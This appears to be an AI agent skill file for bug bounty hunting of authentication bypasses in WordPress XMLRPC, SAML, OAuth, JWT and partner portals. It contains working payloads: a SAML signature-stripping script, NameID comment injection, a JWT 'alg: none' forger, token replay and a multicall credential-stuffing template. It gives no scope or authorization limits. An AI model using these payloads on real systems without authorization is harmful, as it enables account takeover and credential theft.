---
name: hunt-auth-bypass
description: Hunting skill for auth bypass vulnerabilities. Built from 4 public bug bounty reports. Use when hunting auth bypass on any target.
sources: github
report_count: 4
---

## Crown Jewel Targets

Auth bypass is consistently one of the highest-paying vulnerability classes in bug bounty because it directly violates the most fundamental security control. High-value targets include:

- **SSO/SAML implementations** at enterprise SaaS companies (Slack, Okta, OneLogin integrations) — payouts regularly in the $5K–$25K+ range
- **Admin panels and partner/internal portals** — subdomain-separated admin surfaces like `partners.shopify.com`, `admin.company.com`
- **Third-party auth plugin integrations** — WordPress plugins (OneLogin, WP-SAML-Auth), Drupal SSO modules, any CMS with pluggable auth
- **XMLRPC endpoints** on WordPress — often forgotten, bypasses standard WP auth flows entirely
- **OAuth callback flows** — state parameter mishandling, redirect_uri mismatches
- **API authentication layers** — especially where auth was bolted on after the fact

**Asset priority:** Targets with federated identity (SAML, OAuth, OIDC) connected to large user populations. Partner/reseller portals are particularly juicy because they often have elevated permissions and less security scrutiny than the main product.

---

## Attack Surface Signals

**URL patterns to hunt:**
```
/xmlrpc.php
/wp-login.php
/saml/
/sso/
/auth/saml/callback
/oauth/callback
/partners.*
/admin.*
/?wc-api=
/api/v*/auth
/login?redirect=
/accounts/login
```

**Response headers signaling SSO:**
```
X-Frame-Options: SAMEORIGIN (common on SSO portals)
Set-Cookie: SAMLResponse=
Location: https://idp.company.com/saml
WWW-Authenticate: Bearer realm="partners"
```

**JS patterns indicating federated auth:**
```javascript
// Look for in page source
samlRequest
RelayState
SAMLResponse
onelogin
shibboleth
okta
passport.js authenticate
```

**Tech stack signals:**
- WordPress + any SSO plugin → check XMLRPC separately
- Shopify Partner API exposure → cross-tenant privilege escalation risk
- Any app advertising "SSO enabled" or "Login with [Enterprise IdP]"
- Separate subdomains for admin/partner that share session cookies with main domain
- Applications using `SimpleSAMLphp`, `ruby-saml`, `python-saml`

**Burp passive scan triggers:**
- `SAMLResponse` in any POST body
- `openid_connect` or `id_token` in responses
- Cookie domains set to `.company.com` (wildcard)

---

## Step-by-Step Hunting Methodology

1. **Map all authentication entry points**
   - spider the target for every login surface: main login, admin login, API login, partner portal, mobile API endpoints
   - check `robots.txt`, JS files, and the wayback machine for forgotten endpoints like `/xmlrpc.php`

2. **Identify the auth mechanism per entry point**
   - Is it forms-based, SAML, OAuth, API key, session token?
   - For WordPress: always probe `/xmlrpc.php` even if the main login is SSO-protected

3. **Test XMLRPC independently of SSO**
   - If site uses SSO (e.g., OneLogin), manually POST to `/xmlrpc.php`
   - XMLRPC uses WordPress-native credentials, not SSO — test with `system.listMethods` first, then `wp.getUsersBlogs`

4. **Enumerate SAML implementation**
   - Capture a valid SAMLResponse via Burp
   - Decode the Base64 payload, inspect the XML
   - Test signature stripping, comment injection, and XML wrapping attacks
   - Test if SP validates the signature at all (send unsigned assertion)

5. **Test cross-portal session/token reuse**
   - Log into `partners.shopify.com` type portals
   - Attempt to use the issued token/cookie against the main admin portal
   - Look for shared cookie domains, shared JWT secrets, or API tokens that work across contexts

6. **Fuzz auth parameters**
   - Null/empty passwords, `password[]=array`, SQL in username field
   - Try `admin`/`admin`, `test`/`test` on staging subdomains
   - Modify `role`, `is_admin`, `user_type` in JWTs (none algorithm, weak secret)

7. **Check redirect and state parameters**
   - Does removing `state` from OAuth break anything?
   - Can you change `redirect_uri` to an open redirect target?
   - Does the `RelayState` in SAML get validated?

8. **Verify impact by escalating privileges**
   - Don't stop at login — prove you can access admin functions, other users' data, or sensitive configuration
   - Screenshot the highest-privilege action you can perform

---

## Payload & Detection Patterns

**XMLRPC auth probe (bypasses SSO):**
```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# If 200 with method list → XMLRPC is enabled, test auth:
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

**SAML signature stripping (send unsigned assertion):**
```python
import base64, re

# Decode captured SAMLResponse
saml_b64 = "BASE64_FROM_BURP"
saml_xml = base64.b64decode(saml_b64).decode()

# Strip the Signature element entirely
stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)

# Re-encode and submit
print(base64.b64encode(stripped.encode()).decode())
```

**SAML XML comment injection (username confusion):**
```xml
<!-- Original NameID -->
<NameID>attacker@evil.com</NameID>

<!-- Injected to confuse parser -->
<NameID>attacker@evil.com<!---->.victim@company.com</NameID>

<!-- Or namespace confusion -->
<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>
```

**Partner/cross-portal token reuse test:**
```bash
# Get token from partner portal
TOKEN=$(curl -s -X POST https://partners.target.com/login \
  -d 'email=attacker@test.com&password=pass' \
  -c cookies.txt | grep -o 'token=[^;]*')

# Replay against admin portal
curl -s https://admin.target.com/dashboard \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: $TOKEN"
```

**JWT none algorithm attack:**
```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
print(token)
```

**Grep patterns for auth bypass surface:**
```bash
# Find XMLRPC in scope
grep -r "xmlrpc" scope_urls.txt

# Find SSO indicators in JS
grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js

# Find partner/admin subdomains
subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
```

---

## Common Root Causes

1. **SSO bypasses local auth entirely at the UI layer, but not at the API layer** — developers disable the login form but forget that API endpoints (`/xmlrpc.php`, REST API, mobile API) have their own auth handlers that still accept native credentials.

2. **SAML signature validation is skipped or optional** — library defaults often don't enforce signature checking; developers use `wantAssertionsSigned: false` or fail to configure the IdP certificate correctly.

3. **Shared session infrastructure across different trust levels** — partner portals and admin portals reuse the same session cookie or JWT secret because they're built on the same internal framework, assuming access control at the application layer is sufficient.

4. **Trust inheritance in multi-tenant architectures** — a token issued in a lower-privilege context (partner, reseller) is accepted in a higher-privilege context because the verification only checks signature validity, not the issuance context.

5. **Plugin/module auth is independent of application auth** — every WordPress plugin that handles auth (contact forms, REST API extensions, WooCommerce) may implement its own auth handler inconsistently with the main site's SSO.

6. **XML parsing inconsistencies** — different XML parsers (used by SP vs. IdP) handle comments, namespaces, and whitespace differently, enabling confusion attacks where the signed content differs from the evaluated content.

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| SSO enforced on login page | Probe alternate entry points: XMLRPC, REST API, mobile API, legacy endpoints |
| SAML signature validation | XML comment injection, namespace wrapping, signature wrapping (XSW), remove signature entirely |
| IP allowlisting on admin portal | Use partner portal token if it shares auth backend |
| Rate limiting on login | XMLRPC allows credential stuffing via `system.multicall` — batches hundreds of auth attempts in one request |
| CSRF token on login form | SAML flow is POST-based cross-origin by design; no CSRF token needed on `/saml/callback` |
| JWT signature validation | `alg: none`, key confusion (RS256 → HS256 with public key as secret), brute-force weak secrets |
| Separate session stores per portal | Check if cookie domain is `.target.com` (wildcard) — cookie bleeds between subdomains |
| MFA on primary login | If SAML SP doesn't enforce MFA at the assertion level and accepts pre-auth assertions, MFA can be skipped |

**XMLRPC multicall for mass auth bypass:**
```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <!-- repeat for each credential pair -->
  </data></array></value></param></params>
</methodCall>
```

---

## Gate 0 Validation

Before writing any report, answer these three questions:

1. **What can the attacker DO right now?**
   Must be: authenticate as another user OR authenticate without valid credentials OR elevate to admin/privileged role. "Partial information disclosure" is not auth bypass.

2. **What does the victim LOSE?**
   Must identify a concrete asset: account takeover of specific user, access to all admin functions, ability to read/modify other tenants' data, or access to privileged APIs. Abstract "security control bypass" without impact is not sufficient.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: (a) start from a fresh browser/session, (b) follow your exact steps, and (c) arrive at authenticated access to a protected resource. If reproduction requires special preconditions you can't re-create (a specific victim's active session, timing windows), the report needs more work.

---

## Real Impact Examples

**Scenario 1 — SSO Enforcement Bypassed via Forgotten Protocol Endpoint**
A large ride-sharing company enforced SSO (via OneLogin) on all WordPress-based internal/public properties. The XMLRPC endpoint (`/xmlrpc.php`) remained active and accepted WordPress-native credentials entirely independent of the SSO flow. An attacker with any valid WP-native credentials (obtained via credential stuffing or from a previous breach) could authenticate directly through XMLRPC, bypassing MFA, SSO policies, and IP restrictions enforced on the main login form. Impact: Full authenticated access to all WordPress functions available to that user role, including content management and potentially admin functions.

**Scenario 2 — SAML Assertion Forgery via Signature Validation Failure**
A major enterprise communication platform's SAML SP implementation failed to properly validate assertion signatures in specific edge cases. By manipulating the XML structure of a captured SAMLResponse (specifically through comment injection or namespace prefix attacks), an attacker could modify the `NameID` value to impersonate any user in an organization — including workspace administrators — without possessing that user's credentials or private key material. Impact: Complete account takeover of any user within a SAML-enabled organization; attacker gains access to all messages, files, and integrations in the workspace.

**Scenario 3 — Cross-Portal Privilege Escalation via Shared Auth Backend**
An e-commerce platform's partner/reseller portal issued authentication tokens that were validated by the same backend service as the merchant admin portal. A partner-level account (lower trust, external-facing) could use its issued credentials or tokens to authenticate directly against admin-tier API endpoints, bypassing the merchant onboarding and permission assignment flow. Impact: A malicious partner could access any merchant's admin panel, modify store configurations, exfiltrate customer PII and payment data, or install malicious scripts — affecting thousands of merchant storefronts.